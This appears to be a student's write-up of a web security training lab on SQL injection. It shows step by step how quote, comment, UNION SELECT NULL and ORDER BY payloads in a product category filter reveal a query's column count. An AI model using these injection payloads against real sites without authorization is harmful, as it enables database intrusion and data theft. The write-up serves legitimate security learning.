# SQL injection UNION attack, determining the number of columns returned by the query

- sqli: product category filter
- end goal: determine the nuber of columns return by the query

### Analysis

- url: `https://0a26006f04f4376180e33fdd00fb0046.web-security-academy.net/`

- front-end: `/filter?category=Pets`
- back-end:
```sql
select * from product where category = 'Pets' and released = 1
```

- check sqli vulnerability
- front-end: `/filter?category='`
- back-end:
```sql
select * from product where category = ''' and released = 1
'-- 500 Internal server error
```
- front-end: `/filter?category='--`
- back-end:
```sql
select * from product where category = ''--' and released = 1
-- 200 OK: this website have sqli vulnerability
```

- front-end: `/filter?category=Pets' union select null--`
- back-end:
```sql
select * from product where category = 'Pets' union select null--' and released = 1
-- 500 Internal Server Error
-- you have to add more null untill you get 200 response
```

- front-end: `/filter?category=Pets' union select null, null, null--`
- back-end:
```sql
select * from product where category = 'Pets' union select null, null, null--' and released = 1
-- 200 OK: this website have 3 columns
```

- I have another technique
- front-end: `/filter?category=Pets' order by 1--`
- back-end:
```sql
select * from product where category = 'Pets' order by 1--' and released = 1
-- 200 OK
```
- this payload didn't give you an error 
- but you can try to change the number untill you see an error like this
- front-end: `/filter?category=Pets' order by 4--`
- back-end:
```sql
select * from product where category = 'Pets' order by 4--' and released = 1
-- 500 Internal Server Error
-- this website output an error that tell me this website have only 3 columns
```
- So, you can shoose these technique to find columns

---